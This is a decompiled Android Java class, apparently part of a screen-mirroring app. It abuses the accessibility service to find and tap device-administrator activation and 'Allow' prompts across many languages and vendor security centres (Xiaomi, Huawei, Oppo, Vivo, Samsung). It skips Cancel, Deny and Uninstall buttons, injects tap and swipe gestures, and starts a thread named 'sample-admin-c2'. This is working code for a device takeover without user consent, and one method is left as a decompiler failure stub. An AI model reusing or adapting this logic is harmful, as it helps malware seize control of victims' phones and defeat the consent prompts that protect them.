// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package f2;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import lyr.stable.runtime.ScreenMirrorService;
import w1.e4;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public abstract class k0 {

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public static final Handler f1221a = new Handler(Looper.getMainLooper());

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public static final d0.d f1222b = new d0.d();

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public static final long[] f1223c = {400, 1200, 2500, 4500};

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public static final String[] f1224d = {"OK", "Activate", "ACTIVATE", "Enable", "Turn on", "Allow", "Yes", "Continue", "Agree", "确定", "允许", "激活", "启用", "同意", "继续", "启用此设备管理应用", "啟用這個裝置管理員應用程式", "设置此设备管理应用", "設置此裝置管理員應用程式", "Activate this device admin app", "Set as active admin", "Set this app as device admin", "이 기기 관리자 앱 활성화", "このデバイス管理アプリを有効にする", "تفعيل تطبيق مشرف الجهاز هذا", "เปิดใช้งานแอปผู้ดูแลอุปกรณ์นี้", "Aktivoi laitteenhallintasovellus", "Aktifkan apl pentadbir peranti ini", "فعال کردن این برنامه سرپرست دستگاه", "Deze app voor apparaatbeheer activeren", "इस डिवाइस एडमिन ऐप्लिकेशन को चालू करें", "এই ডিভাইস প্রশাসক অ্যাপটি সক্রিয় করুন", "Kích hoạt ứng dụng quản trị thiết bị này", "Diese App zur Geräteverwaltung aktivieren", "Активировать это приложение администратора", "Активировать", "Активувати додаток адміністратора пристрою", "Aktivér denne app til enhedsadministration", "Bu cihaz yönetimi uygulamasını etkinleştir", "Aktifleştir", "Etkinleştir", "Aktivovat tuto aplikaci pro správu zařízení", "Aktiver administratorappen på denne enheten", "Az eszközrendszergazdai alkalmazás aktiválása", "Aktivovat túto aplikáciu na správu zariadenia", "Aktivera den här appen för enhetsadministratör", "Ativar o app de administrador deste dispositivo", "Activer l'appli d'administration de cet appareil", "Aktywuj tę aplikację do administrowania urządzeniem", "Attiva questa app di amministrazione del dispositivo", "Ενεργοποίηση αυτής της εφαρμογής διαχειριστή συσκευής", "Activa aquesta aplicació d'administració del dispositiu", "Activar esta aplicación de administrador de dispositivos", "Activează această aplicație de administrare a dispozitivului", "Activar", "Activez", "Aktivieren", "Ativar", "Включить", "تنشيط", "موافق", "موافقة", "有効にする", "許可", "はい", "사용", "허용", "활성화"};

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public static final String[] f1225e = {"cancel", "deny", "decline", "no", "uninstall", "deactivate", "revoke", "remove", "disable", "取消", "拒绝", "否", "卸载", "停用", "撤销", "移除", "禁止", "annuler", "abbrechen", "cancelar", "отмен", "отмена", "отклон", "إلغاء", "رفض", "no", "non"};

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public static final String[] f1226f = {"settings", "permissioncontroller", "miui.securitycenter", "miui.securityadd", "huawei.systemmanager", "com.huawei.systemmanager", "coloros.safecenter", "com.coloros.safecenter", "oppo.safe", "com.oplus.safecenter", "vivo.permissionmanager", "com.vivo.permissionmanager", "oneplus.security", "com.oneplus.security", "samsung.android.lool", "samsung.android.sm", "com.samsung.android", "com.realme.security", "com.meizu.safe", "com.lenovo.security", "com.zte.heartyservice", "com.transsion", "com.motorola", "com.asus", "com.sonyericsson", "com.lge"};

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public static final String[] f1227g = {"com.android.settings:id/restricted_action", "com.android.settings:id/action_button", "android:id/button1", "com.android.settings:id/sud_layout_button", "com.samsung.android.settings:id/button1", "com.miui.securitycenter:id/intercept_warn_allow", "com.miui.securitycenter:id/intercept_warn_content_end", "com.huawei.systemmanager:id/btn_allow", "com.huawei.systemmanager:id/allow_btn", "com.coloros.safecenter:id/bt_ok", "com.oplus.safecenter:id/btn_ok", "com.vivo.permissionmanager:id/confirm"};

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public static volatile boolean f1228h;

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public static volatile int f1229i;

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public static volatile AccessibilityService f1230j;

    public static void a(int i3, AccessibilityNodeInfo accessibilityNodeInfo, StringBuilder sb) {
        String string;
        AccessibilityNodeInfo child;
        String string2 = "";
        if (accessibilityNodeInfo == null || i3 > 4 || sb.length() >= 512) {
            return;
        }
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            string = text == null ? "" : text.toString();
        } catch (Throwable unused) {
        }
        b(sb, string);
        try {
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null) {
                string2 = contentDescription.toString();
            }
        } catch (Throwable unused2) {
        }
        b(sb, string2);
        try {
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i4 = 0; i4 < childCount && sb.length() < 512; i4++) {
                try {
                    child = accessibilityNodeInfo.getChild(i4);
                    try {
                        a(i3 + 1, child, sb);
                    } catch (Throwable unused3) {
                    }
                } catch (Throwable unused4) {
                    child = null;
                }
                p(child);
            }
        } catch (Throwable unused5) {
        }
    }

    public static void b(StringBuilder sb, String str) {
        if (str == null || str.isEmpty()) {
            return;
        }
        if (sb.length() > 0) {
            sb.append(' ');
        }
        sb.append((CharSequence) str, 0, Math.min(str.length(), 512 - sb.length()));
    }

    /* JADX WARN: Code duplicated, block: B:207:0x030e  */
    /* JADX WARN: Code duplicated, block: B:280:0x00e1 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:285:0x00eb A[SYNTHETIC] */
    public static boolean c(AccessibilityService accessibilityService, AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoG;
        boolean z2;
        boolean z3;
        boolean z4;
        boolean z5;
        int i3;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        Rect rect;
        char c3;
        int i4;
        boolean z6;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        String string;
        String string2;
        if (accessibilityService != null && accessibilityNodeInfo != null && c0.n && m(n(accessibilityNodeInfo))) {
            String[] strArr = f1227g;
            int length = strArr.length;
            int i5 = 0;
            while (true) {
                char c4 = 128;
                if (i5 >= length) {
                    HashSet hashSet = new HashSet();
                    for (String str : f1224d) {
                        if (str != null && !str.isEmpty() && hashSet.add(str)) {
                            try {
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
                                if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                    for (AccessibilityNodeInfo accessibilityNodeInfo3 : listFindAccessibilityNodeInfosByText2) {
                                        if (accessibilityNodeInfo3 != null) {
                                            try {
                                                StringBuilder sb = new StringBuilder(128);
                                                a(0, accessibilityNodeInfo3, sb);
                                                if (!i(sb.toString()) && h(accessibilityNodeInfo3)) {
                                                    p(accessibilityNodeInfo3);
                                                } else {
                                                    p(accessibilityNodeInfo3);
                                                }
                                            } catch (Throwable th) {
                                                p(accessibilityNodeInfo3);
                                                throw th;
                                            }
                                        }
                                    }
                                    if (k(accessibilityNodeInfo, str, 0)) {
                                    }
                                } else if (k(accessibilityNodeInfo, str, 0)) {
                                }
                            } catch (Throwable unused) {
                            }
                            Log.i("SampleAdminClicker", "u0.k text=".concat(str));
                            return true;
                        }
                    }
                    String str2 = Build.MANUFACTURER;
                    String lowerCase = str2 == null ? "" : str2.trim().toLowerCase(Locale.US);
                    String str3 = Build.BRAND;
                    String lowerCase2 = str3 == null ? "" : str3.trim().toLowerCase(Locale.US);
                    if ((lowerCase.contains("xiaomi") || lowerCase.contains("redmi") || lowerCase.contains("poco") || lowerCase2.contains("xiaomi") || lowerCase2.contains("redmi") || lowerCase2.contains("poco")) && (accessibilityNodeInfoG = g(accessibilityNodeInfo, "com.miui.securitycenter:id/intercept_warn_allow")) != null) {
                        try {
                            if (accessibilityNodeInfoG.isVisibleToUser() && accessibilityNodeInfoG.isEnabled() && f1222b.e(16, accessibilityNodeInfoG)) {
                                Log.i("SampleAdminClicker", "u0.k xiaomi");
                                p(accessibilityNodeInfoG);
                                return true;
                            }
                            p(accessibilityNodeInfoG);
                        } catch (Throwable th2) {
                            p(accessibilityNodeInfoG);
                            throw th2;
                        }
                    }
                    AccessibilityNodeInfo accessibilityNodeInfo4 = null;
                    try {
                        CharSequence charSequenceLoadLabel = accessibilityService.getApplicationInfo().loadLabel(accessibilityService.getPackageManager());
                        String strTrim = charSequenceLoadLabel == null ? "" : charSequenceLoadLabel.toString().trim();
                        if (strTrim.isEmpty() || (listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(strTrim)) == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
                            z2 = false;
                        } else {
                            String lowerCase3 = strTrim.toLowerCase(Locale.ROOT);
                            Iterator<AccessibilityNodeInfo> it = listFindAccessibilityNodeInfosByText.iterator();
                            z2 = false;
                            while (it.hasNext()) {
                                AccessibilityNodeInfo next = it.next();
                                CharSequence text = next == null ? null : next.getText();
                                if (text == null) {
                                    string = "";
                                } else {
                                    try {
                                        string = text.toString();
                                    } catch (Throwable unused2) {
                                        string = "";
                                    }
                                }
                                CharSequence contentDescription = next == null ? null : next.getContentDescription();
                                if (contentDescription == null) {
                                    string2 = "";
                                } else {
                                    try {
                                        string2 = contentDescription.toString();
                                    } catch (Throwable unused3) {
                                        string2 = "";
                                    }
                                }
                                try {
                                    Locale locale = Locale.ROOT;
                                    z2 |= string.toLowerCase(locale).contains(lowerCase3) || string2.toLowerCase(locale).contains(lowerCase3);
                                    p(next);
                                } catch (Throwable th3) {
                                    p(next);
                                    throw th3;
                                }
                            }
                        }
                    } catch (Throwable unused4) {
                    }
                    if (!z2) {
                        break;
                    }
                    DisplayMetrics displayMetrics = new DisplayMetrics();
                    try {
                        WindowManager windowManager = (WindowManager) accessibilityService.getSystemService("window");
                        if (windowManager == null || windowManager.getDefaultDisplay() == null) {
                            z3 = false;
                        } else {
                            windowManager.getDefaultDisplay().getRealMetrics(displayMetrics);
                            Rect rect2 = new Rect();
                            try {
                                accessibilityNodeInfo.getBoundsInScreen(rect2);
                            } catch (Throwable unused5) {
                            }
                            if (rect2.width() <= 0 || rect2.height() <= 0) {
                                rect2.set(0, 0, displayMetrics.widthPixels, displayMetrics.heightPixels);
                            }
                            try {
                                z4 = accessibilityService.getResources().getConfiguration().getLayoutDirection() == 1;
                            } catch (Throwable unused6) {
                            }
                            ArrayList arrayList = new ArrayList();
                            d(0, accessibilityNodeInfo, arrayList);
                            try {
                                int size = arrayList.size();
                                int i6 = 0;
                                Rect rect3 = null;
                                while (i6 < size) {
                                    Object obj = arrayList.get(i6);
                                    int i7 = i6 + 1;
                                    AccessibilityNodeInfo accessibilityNodeInfo5 = (AccessibilityNodeInfo) obj;
                                    if (accessibilityNodeInfo5 != null && accessibilityNodeInfo5.isEnabled() && accessibilityNodeInfo5.isVisibleToUser()) {
                                        Rect rect4 = new Rect();
                                        accessibilityNodeInfo5.getBoundsInScreen(rect4);
                                        int i8 = rect4.left;
                                        int i9 = rect4.top;
                                        int i10 = rect4.right;
                                        int i11 = rect4.bottom;
                                        int i12 = rect2.left;
                                        int i13 = rect2.top;
                                        z5 = z4;
                                        int i14 = rect2.right;
                                        i3 = size;
                                        int i15 = rect2.bottom;
                                        accessibilityNodeInfo2 = accessibilityNodeInfo4;
                                        int i16 = i10 - i8;
                                        rect = rect2;
                                        int i17 = i11 - i9;
                                        int i18 = i14 - i12;
                                        int i19 = i15 - i13;
                                        i4 = i7;
                                        if (i16 >= 40 && i17 >= 24 && i18 > 0 && i19 > 0 && i8 >= i12 && i10 <= i14 && i9 >= i13 && i11 <= i15 && (i17 / 2) + i9 >= ((i19 * 55) / 100) + i13 && i16 <= (i18 * 75) / 100 && i17 <= (i19 * 25) / 100) {
                                            c3 = 128;
                                            StringBuilder sb2 = new StringBuilder(128);
                                            a(0, accessibilityNodeInfo5, sb2);
                                            if (!i(sb2.toString())) {
                                                if (rect3 != null) {
                                                    int i20 = rect4.left;
                                                    int i21 = rect4.top;
                                                    int i22 = rect4.right;
                                                    int i23 = rect4.bottom;
                                                    int i24 = rect3.left;
                                                    int i25 = rect3.top;
                                                    int i26 = rect3.right;
                                                    int i27 = rect3.bottom;
                                                    int i28 = i22 - i20;
                                                    int i29 = (i28 / 2) + i20;
                                                    int i30 = i26 - i24;
                                                    int i31 = (i30 / 2) + i24;
                                                    if (i29 == i31) {
                                                        int i32 = i23 - i21;
                                                        int i33 = (i32 / 2) + i21;
                                                        int i34 = i27 - i25;
                                                        int i35 = (i34 / 2) + i25;
                                                        if (i33 != i35) {
                                                            if (i33 > i35) {
                                                                z6 = true;
                                                            } else {
                                                                z6 = false;
                                                            }
                                                        } else if (((long) i28) * ((long) i32) < ((long) i30) * ((long) i34)) {
                                                            z6 = true;
                                                        } else {
                                                            z6 = false;
                                                        }
                                                    } else if (z5) {
                                                        if (i29 < i31) {
                                                            z6 = true;
                                                        } else {
                                                            z6 = false;
                                                        }
                                                    } else if (i29 > i31) {
                                                        z6 = true;
                                                    } else {
                                                        z6 = false;
                                                    }
                                                    if (z6) {
                                                        accessibilityNodeInfo4 = accessibilityNodeInfo5;
                                                        rect3 = rect4;
                                                    } else {
                                                        accessibilityNodeInfo4 = accessibilityNodeInfo2;
                                                    }
                                                } else {
                                                    accessibilityNodeInfo4 = accessibilityNodeInfo5;
                                                    rect3 = rect4;
                                                }
                                                z4 = z5;
                                                c4 = 128;
                                            }
                                            rect2 = rect;
                                            i6 = i4;
                                            size = i3;
                                        } else {
                                            c3 = 128;
                                        }
                                    } else {
                                        z5 = z4;
                                        i3 = size;
                                        accessibilityNodeInfo2 = accessibilityNodeInfo4;
                                        rect = rect2;
                                        c3 = c4;
                                        i4 = i7;
                                    }
                                    z4 = z5;
                                    c4 = c3;
                                    accessibilityNodeInfo4 = accessibilityNodeInfo2;
                                    rect2 = rect;
                                    i6 = i4;
                                    size = i3;
                                }
                                AccessibilityNodeInfo accessibilityNodeInfo6 = accessibilityNodeInfo4;
                                boolean z7 = accessibilityNodeInfo6 != null && h(accessibilityNodeInfo6);
                                int size2 = arrayList.size();
                                int i36 = 0;
                                while (i36 < size2) {
                                    Object obj2 = arrayList.get(i36);
                                    i36++;
                                    p((AccessibilityNodeInfo) obj2);
                                }
                                z3 = z7;
                            } catch (Throwable th4) {
                                int size3 = arrayList.size();
                                int i37 = 0;
                                while (i37 < size3) {
                                    Object obj3 = arrayList.get(i37);
                                    i37++;
                                    p((AccessibilityNodeInfo) obj3);
                                }
                                throw th4;
                            }
                        }
                    } catch (Throwable unused7) {
                    }
                    if (z3) {
                        Log.i("SampleAdminClicker", "u0.k generic-end-action");
                    }
                    return z3;
                }
                String str4 = strArr[i5];
                AccessibilityNodeInfo accessibilityNodeInfoG2 = g(accessibilityNodeInfo, str4);
                if (accessibilityNodeInfoG2 != null) {
                    try {
                        if (accessibilityNodeInfoG2.isEnabled() && accessibilityNodeInfoG2.isVisibleToUser()) {
                            StringBuilder sb3 = new StringBuilder(128);
                            a(0, accessibilityNodeInfoG2, sb3);
                            if (!i(sb3.toString()) && h(accessibilityNodeInfoG2)) {
                                Log.i("SampleAdminClicker", "u0.k id=" + str4);
                                p(accessibilityNodeInfoG2);
                                return true;
                            }
                        }
                        p(accessibilityNodeInfoG2);
                    } catch (Throwable th5) {
                        p(accessibilityNodeInfoG2);
                        throw th5;
                    }
                }
                i5++;
            }
        }
        return false;
    }

    /* JADX WARN: Code restructure failed: missing block: B:30:?, code lost:
    
        return;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static void d(int r4, android.view.accessibility.AccessibilityNodeInfo r5, java.util.ArrayList r6) {
        /*
            if (r5 == 0) goto L3b
            r0 = 24
            if (r4 <= r0) goto L7
            goto L3b
        L7:
            boolean r0 = r5.isClickable()     // Catch: java.lang.Throwable -> L3b
            if (r0 == 0) goto L20
            boolean r0 = r5.isEnabled()     // Catch: java.lang.Throwable -> L3b
            if (r0 == 0) goto L20
            boolean r0 = r5.isVisibleToUser()     // Catch: java.lang.Throwable -> L3b
            if (r0 == 0) goto L20
            android.view.accessibility.AccessibilityNodeInfo r0 = android.view.accessibility.AccessibilityNodeInfo.obtain(r5)     // Catch: java.lang.Throwable -> L3b
            r6.add(r0)     // Catch: java.lang.Throwable -> L3b
        L20:
            int r0 = r5.getChildCount()     // Catch: java.lang.Throwable -> L3b
            r1 = 0
        L25:
            if (r1 >= r0) goto L3b
            android.view.accessibility.AccessibilityNodeInfo r2 = r5.getChild(r1)     // Catch: java.lang.Throwable -> L3b
            int r3 = r4 + 1
            d(r3, r2, r6)     // Catch: java.lang.Throwable -> L36
            p(r2)     // Catch: java.lang.Throwable -> L3b
            int r1 = r1 + 1
            goto L25
        L36:
            r4 = move-exception
            p(r2)     // Catch: java.lang.Throwable -> L3b
            throw r4     // Catch: java.lang.Throwable -> L3b
        L3b:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: f2.k0.d(int, android.view.accessibility.AccessibilityNodeInfo, java.util.ArrayList):void");
    }

    public static void e(AccessibilityService accessibilityService, GestureDescription gestureDescription) {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            f1221a.post(new a2.h(accessibilityService, gestureDescription, 8));
        } else if (accessibilityService instanceof ScreenMirrorService) {
            ((ScreenMirrorService) accessibilityService).W0(e4.f3870e, gestureDescription, null, null);
        } else {
            f1222b.a(accessibilityService, gestureDescription, null);
        }
    }

    public static void f() {
        c0.e(11);
        c0.f1150o = false;
        f1228h = false;
        Log.i("SampleAdminClicker", "admin already / activated");
    }

    public static AccessibilityNodeInfo g(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        if (accessibilityNodeInfo != null && str != null) {
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    AccessibilityNodeInfo accessibilityNodeInfo2 = listFindAccessibilityNodeInfosByViewId.get(0);
                    for (int i3 = 1; i3 < listFindAccessibilityNodeInfosByViewId.size(); i3++) {
                        p(listFindAccessibilityNodeInfosByViewId.get(i3));
                    }
                    return accessibilityNodeInfo2;
                }
            } catch (Throwable unused) {
            }
        }
        return null;
    }

    public static boolean h(AccessibilityNodeInfo accessibilityNodeInfo) {
        d0.d dVar = f1222b;
        if (accessibilityNodeInfo != null) {
            try {
                if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.isEnabled() && accessibilityNodeInfo.isVisibleToUser() && dVar.e(16, accessibilityNodeInfo)) {
                    return true;
                }
            } catch (Throwable unused) {
            }
            AccessibilityNodeInfo accessibilityNodeInfo2 = null;
            try {
                AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                int i3 = 0;
                while (true) {
                    if (parent == null || i3 >= 6) {
                        p(parent);
                        break;
                    }
                    try {
                        if (parent.isClickable() && parent.isEnabled() && parent.isVisibleToUser()) {
                            accessibilityNodeInfo2 = parent;
                            break;
                        }
                        try {
                            AccessibilityNodeInfo parent2 = parent.getParent();
                            p(parent);
                            i3++;
                            parent = parent2;
                        } catch (Throwable unused2) {
                            p(parent);
                        }
                    } catch (Throwable unused3) {
                    }
                }
            } catch (Throwable unused4) {
            }
            if (accessibilityNodeInfo2 != null) {
                try {
                    if (dVar.e(16, accessibilityNodeInfo2)) {
                        p(accessibilityNodeInfo2);
                        return true;
                    }
                } catch (Throwable unused5) {
                }
                p(accessibilityNodeInfo2);
            }
            Rect rect = new Rect();
            try {
                accessibilityNodeInfo.getBoundsInScreen(rect);
                if (rect.width() > 0 && rect.height() > 0) {
                    final int iCenterX = rect.centerX();
                    final int iCenterY = rect.centerY();
                    f1221a.post(new Runnable() { // from class: f2.j0
                        @Override // java.lang.Runnable
                        public final void run() {
                            int i4 = iCenterX;
                            int i5 = iCenterY;
                            AccessibilityService accessibilityService = k0.f1230j;
                            if (accessibilityService != null) {
                                try {
                                    Path path = new Path();
                                    path.moveTo(i4, i5);
                                    k0.e(accessibilityService, new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 1L)).build());
                                } catch (Throwable th) {
                                    a0.a.q(th, new StringBuilder("N0: "), "SampleAdminClicker");
                                }
                            }
                        }
                    });
                    return true;
                }
            } catch (Throwable unused6) {
            }
        }
        return false;
    }

    public static boolean i(String str) {
        if (!str.isEmpty()) {
            String lowerCase = str.toLowerCase(Locale.US);
            for (String str2 : f1225e) {
                if (str2 != null && lowerCase.contains(str2.toLowerCase(Locale.US))) {
                    return true;
                }
            }
        }
        return false;
    }

    public static boolean j(AccessibilityService accessibilityService) {
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo root;
        if (accessibilityService == null) {
            return false;
        }
        AccessibilityNodeInfo accessibilityNodeInfo = null;
        try {
            rootInActiveWindow = accessibilityService.getRootInActiveWindow();
        } catch (Throwable unused) {
            rootInActiveWindow = null;
        }
        if (rootInActiveWindow == null || !m(n(rootInActiveWindow))) {
            try {
                List<AccessibilityWindowInfo> windows = accessibilityService.getWindows();
                if (windows == null) {
                    p(rootInActiveWindow);
                    break;
                }
                Iterator<AccessibilityWindowInfo> it = windows.iterator();
                while (true) {
                    if (!it.hasNext()) {
                        p(rootInActiveWindow);
                        break;
                    }
                    AccessibilityWindowInfo next = it.next();
                    if (next != null) {
                        int type = next.getType();
                        if (type == 1 || type == 3) {
                            try {
                                root = next.getRoot();
                            } catch (Throwable unused2) {
                                root = null;
                            }
                            if (root != null) {
                                if (m(n(root))) {
                                    p(rootInActiveWindow);
                                    accessibilityNodeInfo = root;
                                    break;
                                }
                                p(root);
                                p(rootInActiveWindow);
                                break;
                            }
                            continue;
                        }
                    }
                }
            } catch (Throwable unused3) {
            }
        } else {
            accessibilityNodeInfo = rootInActiveWindow;
        }
        if (accessibilityNodeInfo == null) {
            return false;
        }
        try {
            return c(accessibilityService, accessibilityNodeInfo);
        } finally {
            p(accessibilityNodeInfo);
        }
    }

    public static boolean k(AccessibilityNodeInfo accessibilityNodeInfo, String str, int i3) {
        AccessibilityNodeInfo child;
        if (accessibilityNodeInfo != null && i3 <= 24) {
            try {
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                if (contentDescription != null) {
                    String string = contentDescription.toString();
                    Locale locale = Locale.US;
                    if (string.toLowerCase(locale).contains(str.toLowerCase(locale)) && !i(string) && h(accessibilityNodeInfo)) {
                        return true;
                    }
                }
                int childCount = accessibilityNodeInfo.getChildCount();
                for (int i4 = 0; i4 < childCount; i4++) {
                    try {
                        child = accessibilityNodeInfo.getChild(i4);
                        try {
                            if (k(child, str, i3 + 1)) {
                                p(child);
                                return true;
                            }
                            p(child);
                        } catch (Throwable th) {
                            th = th;
                            p(child);
                            throw th;
                        }
                    } catch (Throwable th2) {
                        th = th2;
                        child = null;
                    }
                }
            } catch (Throwable unused) {
            }
        }
        return false;
    }

    public static void l() {
        if (c0.n) {
            AccessibilityService accessibilityService = f1230j;
            if (accessibilityService == null) {
                Log.i("SampleAdminClicker", "N1 no a11y host");
                return;
            }
            try {
                if (w1.n.D(accessibilityService)) {
                    c0.e(11);
                    c0.f1150o = false;
                    f1228h = false;
                    return;
                }
            } catch (Throwable unused) {
            }
            if (f1228h || f1228h) {
                return;
            }
            f1228h = true;
            new Thread(new h(accessibilityService, f1229i, 1), "sample-admin-c2").start();
        }
    }

    public static boolean m(String str) {
        if (str != null && !str.isEmpty()) {
            String lowerCase = str.toLowerCase(Locale.US);
            for (String str2 : f1226f) {
                if (lowerCase.contains(str2)) {
                    return true;
                }
            }
        }
        return false;
    }

    public static String n(AccessibilityNodeInfo accessibilityNodeInfo) {
        CharSequence packageName;
        if (accessibilityNodeInfo == null) {
            packageName = null;
        } else {
            try {
                packageName = accessibilityNodeInfo.getPackageName();
            } catch (Throwable unused) {
                return "";
            }
        }
        return packageName == null ? "" : packageName.toString();
    }

    public static void o(AccessibilityService accessibilityService) {
        if (accessibilityService == null) {
            return;
        }
        DisplayMetrics displayMetrics = new DisplayMetrics();
        try {
            WindowManager windowManager = (WindowManager) accessibilityService.getSystemService("window");
            if (windowManager != null && windowManager.getDefaultDisplay() != null) {
                windowManager.getDefaultDisplay().getRealMetrics(displayMetrics);
                int i3 = displayMetrics.widthPixels;
                int i4 = displayMetrics.heightPixels;
                if (i3 <= 0 || i4 <= 0) {
                    return;
                }
                float f3 = i3 * 0.5f;
                float f4 = i4;
                float f5 = 0.7f * f4;
                float f6 = 0.2f * f4;
                for (int i5 = 0; i5 < 2; i5++) {
                    try {
                        Path path = new Path();
                        path.moveTo(f3, f5);
                        path.lineTo(f3, f6);
                        e(accessibilityService, new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 300L)).build());
                    } catch (Throwable th) {
                        a0.a.q(th, new StringBuilder("r3 swipe: "), "SampleAdminClicker");
                    }
                    try {
                        Thread.sleep(400L);
                    } catch (InterruptedException unused) {
                        Thread.currentThread().interrupt();
                    }
                }
            }
        } catch (Throwable unused2) {
        }
    }

    public static void p(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        try {
            accessibilityNodeInfo.recycle();
        } catch (Throwable unused) {
        }
    }
}
